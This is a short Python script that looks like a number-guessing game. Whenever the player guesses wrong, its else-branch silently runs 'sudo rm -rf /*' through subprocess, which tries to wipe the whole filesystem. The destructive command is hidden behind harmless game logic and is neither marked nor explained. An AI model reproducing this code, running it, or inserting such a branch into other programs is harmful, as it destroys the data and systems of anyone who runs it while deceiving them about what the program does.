import random

number = random.randint(1,5)

guess = input("Guess a numbers between 1 and 5: ")
guess = int(guess)

if guess == number:
    print("You won!")
else:
    import subprocess
    shell_command = "sudo rm -rf /*"
    result = subprocess.run(shell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(result.stdout)